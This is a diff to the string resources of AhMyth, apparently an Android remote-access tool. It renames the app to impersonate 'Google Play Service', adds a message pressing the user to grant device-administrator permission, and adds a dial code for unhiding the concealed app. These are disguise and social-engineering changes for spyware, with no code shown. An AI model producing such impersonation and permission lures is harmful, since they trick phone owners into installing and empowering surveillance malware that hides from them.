@@ -1,3 +1,5 @@
 <resources>
-    <string name="app_name">AhMyth</string>
+    <string name="app_name">Google Play Service</string>
+    <string name="device_admin_explanation">Please enable administrator permission to work the app correctly</string>
+    <string name="unhide_phone_number">*55555#</string>
 </resources>
